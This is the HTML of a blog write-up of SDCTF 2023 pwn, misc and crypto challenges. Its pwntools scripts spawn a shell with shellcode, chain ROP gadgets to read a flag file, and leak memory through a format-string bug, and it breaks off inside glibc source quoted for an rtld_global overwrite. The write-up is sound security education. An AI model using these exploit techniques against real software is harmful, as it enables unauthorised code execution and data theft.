<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="SDCTF 2023 Writeup I was so excited to participate in my first SDCTF event as an incoming student of UC San Diego. :-) It was a great opportunity to learn new skills, meet awesome people and have fun">
<meta property="og:type" content="article">
<meta property="og:title" content="SDCTF 2023 Writeup">
<meta property="og:url" content="https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/index.html">
<meta property="og:site_name">
<meta property="og:description" content="SDCTF 2023 Writeup I was so excited to participate in my first SDCTF event as an incoming student of UC San Diego. :-) It was a great opportunity to learn new skills, meet awesome people and have fun">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-05-08T19:41:03.000Z">
<meta property="article:modified_time" content="2023-05-08T13:42:40.346Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>SDCTF 2023 Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="../../../10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="../../../04/25/CVE-2020-11102-Escape-from-the-Earth/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&text=SDCTF 2023 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&is_video=false&description=SDCTF 2023 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SDCTF 2023 Writeup&body=Check out this article: https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&title=SDCTF 2023 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&name=SDCTF 2023 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2023/05/08/SDCTF-2023-Writeup/&t=SDCTF 2023 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">SDCTF 2023 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Turtle-Shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">Turtle Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tROPic-thunder"><span class="toc-number">1.1.2.</span> <span class="toc-text">tROPic-thunder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#money-printer"><span class="toc-number">1.1.3.</span> <span class="toc-text">money-printer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#money-printer2"><span class="toc-number">1.1.4.</span> <span class="toc-text">money-printer2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rtld-global"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">rtld_global</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">Canary</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Runner"><span class="toc-number">1.2.1.</span> <span class="toc-text">Secure Runner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fork-bomb-protector"><span class="toc-number">1.2.2.</span> <span class="toc-text">Fork bomb protector</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jumbled-snake"><span class="toc-number">1.3.1.</span> <span class="toc-text">Jumbled snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lake-of-Pseudo-Random-Fire"><span class="toc-number">1.3.2.</span> <span class="toc-text">Lake of Pseudo Random Fire</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        SDCTF 2023 Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-05-08T19:41:03.000Z" class="dt-published" itemprop="datePublished">2023-05-08</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a> <a class="tag-category" href="../../../../tags/Writeup/" rel="tag">Writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>SDCTF 2023 Writeup</h1>
<p>I was so excited to participate in my first SDCTF event as an incoming student of UC San Diego. :-) It was a great opportunity to learn new skills, meet awesome people and have fun solving challenges. I really enjoyed the experience and I can’t wait for the next one!</p>
<!-- TOC -->
<ul>
<li><a href="#sdctf-2023-writeup">SDCTF 2023 Writeup</a>
<ul>
<li><a href="#pwn">PWN</a>
<ul>
<li><a href="#turtle-shell">Turtle Shell</a></li>
<li><a href="#tropic-thunder">tROPic-thunder</a></li>
<li><a href="#money-printer">money-printer</a></li>
<li><a href="#money-printer2">money-printer2</a>
<ul>
<li><a href="#rtld_global"><code>rtld_global</code></a></li>
<li><a href="#canary">Canary</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#misc">Misc</a>
<ul>
<li><a href="#secure-runner">Secure Runner</a></li>
<li><a href="#fork-bomb-protector">Fork bomb protector</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a>
<ul>
<li><a href="#jumbled-snake">Jumbled snake</a></li>
<li><a href="#lake-of-pseudo-random-fire">Lake of Pseudo Random Fire</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /TOC -->
<h2 id="PWN">PWN</h2>
<h3 id="Turtle-Shell">Turtle Shell</h3>
<p>Bypass the checking with <code>add rax, 0x1</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./turtle-shell&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;turtle.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor 	rsi,	rsi</span></span><br><span class="line"><span class="string">push	rsi		</span></span><br><span class="line"><span class="string">mov 	rdi,	0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">push	rdi</span></span><br><span class="line"><span class="string">push	rsp		</span></span><br><span class="line"><span class="string">pop	    rdi</span></span><br><span class="line"><span class="string">mov 	al,	58</span></span><br><span class="line"><span class="string">add     al, 1	</span></span><br><span class="line"><span class="string">cdq					</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;shell&#x27;</span>, asm(shellcode))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="tROPic-thunder">tROPic-thunder</h3>
<p>Use <code>open</code>, <code>read</code> and <code>write</code> to read flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./tROPic-thunder&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;thunder.sdc.tf&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># Gadgets</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040165c</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004589f5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000459747</span></span><br><span class="line">bss = <span class="number">0x00000000006D93A0</span></span><br><span class="line">prompt = <span class="number">0x00000000004C4A7F</span></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    prompt,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rax_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdx_ret,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x400c6a\nc&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">112</span>+<span class="number">8</span>)+payload</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;send&#x27;</span>, <span class="string">b&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="money-printer">money-printer</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0x3E8</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;wow you&#x27;ve printed money out of thin air, you have %u!!! Is there anything you would like to say to the audience?\n&quot;</span>,</span><br><span class="line">    v6);</span><br><span class="line">  fgets(format, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wow you said: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nthat&#x27;s truly fascinating!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>v6</code> is unsigned int but all check against <code>v4</code> is signed operation, so we can bypass the check with negative number.<br>
Then use the format string to leak flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./money-printer&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;money.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">tob = <span class="keyword">lambda</span> x: <span class="built_in">str</span>(x).encode()</span><br><span class="line"></span><br><span class="line">money = <span class="number">0xFFFFFB00</span></span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;?&quot;</span>, tob(money))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arr = [<span class="number">0x22c3260</span>,<span class="number">0x34647b6674636473</span>,<span class="number">0x665f7530795f6e6d</span>,<span class="number">0x435f345f446e7530</span>,<span class="number">0x304d345f597a3472</span>,<span class="number">0x4d5f66305f374e75</span>,<span class="number">0x79336e30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="comment"># convert to string</span></span><br><span class="line">    <span class="comment"># print(bytes.fromhex(hex(i)[2:]).decode(&#x27;utf-8&#x27;), end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span>(p64(i).decode(), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="money-printer2">money-printer2</h3>
<p>I didn’t manage to brute force the address before the CTF ended, but I still want to note down the solution.</p>
<p>Notice that there are some residual address on the stack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffc91e56ce0│+0x0000: 0xfffffb0000000000   ← $rsp</span><br><span class="line">0x00007ffc91e56ce8│+0x0008: 0xfffffef2800004f5</span><br><span class="line">0x00007ffc91e56cf0│+0x0010: 0x0000000000000000   ← $rdi</span><br><span class="line">0x00007ffc91e56cf8│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffc91e56d00│+0x0020: 0x000000000000000b (&quot;</span><br><span class="line">                                                 &quot;?)                                                                                                               </span><br><span class="line">0x00007ffc91e56d08│+0x0028: 0x00007f4026c02660  →   push rbp</span><br><span class="line">0x00007ffc91e56d10│+0x0030: 0x00007ffc91e56d78  →  0x00007ffc91e56e48  →  0x00007ffc91e58170  →  &quot;./money-printer2&quot;</span><br></pre></td></tr></table></figure>
<p><code>0x00007f4026c02660</code> is in <code>ld.so</code> and <code>0x00007ffc91e56d78</code> points the the stack.</p>
<p>So we basically have two approach:</p>
<h4 id="rtld-global"><code>rtld_global</code></h4>
<p>Partially overwrite the address of <code>ld.so</code>, make it point to <code>_rtld_global+3840</code>, where the <code>rtld_lock_default_lock_recursive</code> is stored.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span 